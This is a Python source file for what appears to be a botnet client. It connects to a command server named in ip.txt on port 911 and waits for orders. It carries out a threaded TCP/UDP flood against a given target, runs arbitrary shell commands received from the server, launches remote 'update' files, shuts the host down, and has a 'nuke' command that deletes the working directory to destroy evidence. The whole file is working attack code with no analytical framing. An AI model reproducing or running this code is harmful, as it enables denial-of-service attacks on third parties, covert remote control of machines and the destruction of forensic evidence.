import socket, time, sys, shutil, subprocess, tkinter, threading, random, os, traceback
from tkinter import Tk
from datetime import datetime
connected = False
nocommand = True
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hostlocation = "ip.txt"
port = 911
request = ""
hostname = socket.gethostname()

s.settimeout(5)

global exitFlag
exitFlag = 1

def timenow():
    return ("[" + datetime.now().strftime('%H:%M:%S') + "]")

def ELog(error):
    print(error)
    tb = traceback.format_exc()
    print(tb)
    erid = 0
    esaved = False
    try:
        while not esaved:
            efile = str(os.getcwd()) + "\\Logs\\Error-" + str(socket.gethostname()) + "-" + str(datetime.now().strftime('%H.%M.%S')) + "-" + str(erid) + ".txt"
            if not os.path.isfile(efile):
                efn = open(efile, "w")
                efn.write(error + "\r\n")
                efn.write(str(tb))
                efn.close()
                esaved = True
            else:
                erid = erid + 1
    except Exception as ex:
        print("Error Logging Error: " + str(ex))

print (timenow())
def DoS(Target,Port,Protocol,RandomPackets,Multiplier):
    Data="qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
    try:
        Target=Target
        Port=int(Port)
        Protocol=Protocol
        Rap=RandomPackets
        Multiplier=int(Multiplier)
    except Exception as ex:
        print("An incorrect value was given: " + str(ex))
        time.sleep(2)
        sys.exit()

    Adr=(Target,Port)
    s.settimeout(0.01)
    Total_data = 0
    while not exitFlag:
        if Protocol.lower() =='tcp':
            Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        elif Protocol.lower() =='udp':
            Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        elif Protocol.lower() =='raw':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_RAW)
        elif Protocol.lower() =='rdm':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_RDM)
        elif Protocol.lower() =='seq':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_SEQPACKET)
        success = False
        Sock.settimeout(1)
        try:
            Sock.connect(Adr)
            success = True
        except Exception as err:
            print (timenow() + " An Error Occured: " + str(err))
            print ("")
            time.sleep(2)
        if success:
            if Rap.lower()=='on':
                Bytes=(Data*random.randrange(16,64))
                BytesEnc=str.encode(Bytes*Multiplier)
            elif Rap.lower()=='off':
                Bytes=(Data*Multiplier)
                BytesEnc=str.encode(Bytes)
            elif Rap.lower()=='cus':
                Data="A"
                Bytes=(Data*(Multiplier-33))
                BytesEnc=str.encode(Bytes)
            Sock.sendall(BytesEnc)

            Total_data = Total_data + sys.getsizeof(BytesEnc)
            print(timenow() + ' Flooding {0} in port {1} with {2} bytes of data  |  Sent {3} bytes in total to {0} in port {1}'.format(Target, Port, sys.getsizeof(BytesEnc), Total_data))
            if socket.error:
                try:
                    Sock.shutdown(socket.SHUT_RDWR)
                except Exception as err:
                    print (timenow() + " An Error Occured: " + str(err))
                    print ("")
                    time.sleep(1)
                Sock.close
                del Sock


class myThread (threading.Thread):
    def __init__(self, threadID, name, inreq):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.inreq = inreq
    def run(self):
        print ("Starting " + self.name)
        DoS(self.inreq[1],self.inreq[2],self.inreq[3],self.inreq[4],self.inreq[5])
        print ("Exiting " + self.name)

def alert(AlertTitle, AlertMessage ,mstime):
    box = Tk()
    box.title(AlertTitle)
    tkinter.Message(box, text = AlertMessage, bg='red',
      fg='ivory').pack(padx=1, pady=1) #, relief=GROOVE
    tkinter.Button(box, text="Close", command=box.destroy).pack(side=tkinter.BOTTOM)
    box.geometry('300x150')
    def closeAlert():
        box.destroy()
    box.after(mstime, closeAlert)
    box.mainloop()



threadList = ["DoS-Thread"]
global threads
threads = []
threadID = 1


def checkformessages():
                    try:
                        data = s.recv(4096)
                        if not data:
                            connected = False
                            message = 'Disconnected from server'
                            print(timenow() + message)
                        else:
                            globals()["request"] = data.decode()
                            if data.decode() != " " and data.decode() != "isconnectionactive" and data.decode() != "":
                                globals()["nocommand"] = False
                                if data.decode()[:3] != "msg":
                                    print(globals()["request"])
                            if data.decode() == "isconnectionactive":
                                s.send(" ".encode())
                    except Exception as ex:
                        if str(ex) != "timed out":
                            print(str(ex))
                        if str(ex) == "[WinError 10054] An existing connection was forcibly closed by the remote host":
                            print(str(ex))
                            # Notify threads it's time to exit
                            global threads
                            global exitFlag
                            exitFlag = 1

                            # Wait for all threads to complete
                            for t in threads:
                                t.join()
                            threads = []
                            time.sleep(1)
                            globals()["connected"] = False


while True:
    try:
        s.settimeout(5)
        if not connected:
            print("")
            print("---------------------------------------------------------")
            print("                    RESTARTING SOCKET                    ")
            print("---------------------------------------------------------")
            print("")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while not connected:
                try :
                    fn = open(hostlocation, "r")
                    host = fn.read()
                    fn.close()
                    s.connect((host, port))
                    ID = s.recv(4096).decode()
                    print("Client ID: " + ID)
                    s.send(hostname.encode())
                    message = 'Connected to remote host. Awaiting Command'
                    print(timenow() + message)
                    print("")
                    connected = True

                except Exception as ex:
                    print(str(ex))
                    message = 'Unable to connect'
                    print(timenow() + message)
                    time.sleep(2)

        elif nocommand:
            checkformessages()
        else:
            request = request.split(" -")
            try:
                if request[0] == "DoS":
                    exitFlag = 0
                    for tName in threadList:
                        thread = myThread(threadID, tName, request)
                        thread.start()
                        threads.append(thread)
                        threadID += 1

                    #try:
                    #    DoS(request[1],request[2],request[3],request[4],request[5],s)
                    #except KeyboardInterrupt:
                    #    pass
                elif request[0].lower() == "msg":
                    print(request[1])
                elif request[0].lower() == "msgbox":
                    alert(request[1],request[2],int(int(request[3]) * 1000))
                elif request[0].lower() == "exit":
                    # Notify threads it's time to exit
                    exitFlag = 1

                    # Wait for all threads to complete
                    for t in threads:
                        t.join()
                    threads = []
                    sys.exit()
                elif request[0].lower() == "stop":
                    # Notify threads it's time to exit
                    exitFlag = 1

                    # Wait for all threads to complete
                    for t in threads:
                        t.join()
                    threads = []
                elif request[0].lower() == "update":
                    try:
                        upfile = str(os.getcwd()) + "\\" + str(request[1])
                        # Notify threads it's time to exit
                        exitFlag = 1

                        # Wait for all threads to complete
                        for t in threads:
                            t.join()
                        threads = []
                        print(upfile)
                        os.startfile(upfile)
                        sys.exit()
                    except Exception as ex:
                        ELog(str(ex))
                        raise(Exception("Unknown Request"))
                elif request[0].lower() == "run":
                    try:
                        os.system(request[1])
                    except Exception as ex:
                        ELog(str(ex))

                elif request[0].lower() == "nuke":
                    # Notify threads it's time to exit
                    exitFlag = 1

                    # Wait for all threads to complete
                    for t in threads:
                        t.join()
                    threads = []
                    #Destroy Evidence
                    try:
                        shutil.rmtree(".")
                        print("Evidence Successfully Destroyed!")
                    except Exception as ex:
                        print("An error occured while destroying evidence: " + str(ex))
                    time.sleep(5)
                    sys.exit()
                elif request[0].lower() == "shutdown":
                    # Notify threads it's time to exit
                    exitFlag = 1

                    # Wait for all threads to complete
                    for t in threads:
                        t.join()
                    threads = []
                    subprocess.call(["shutdown", "/s", "/t", "5"])
                else:
                    raise(Exception("Unknown Request"))
            except Exception as ex:
                print(str(ex))
            nocommand = True
            print("")#
    except Exception as ex:
        ELog("Main Loop Error: " + str(ex))

# Notify threads it's time to exit
exitFlag = 1

# Wait for all threads to complete
for t in threads:
    t.join()
threads = []
sys.exit()
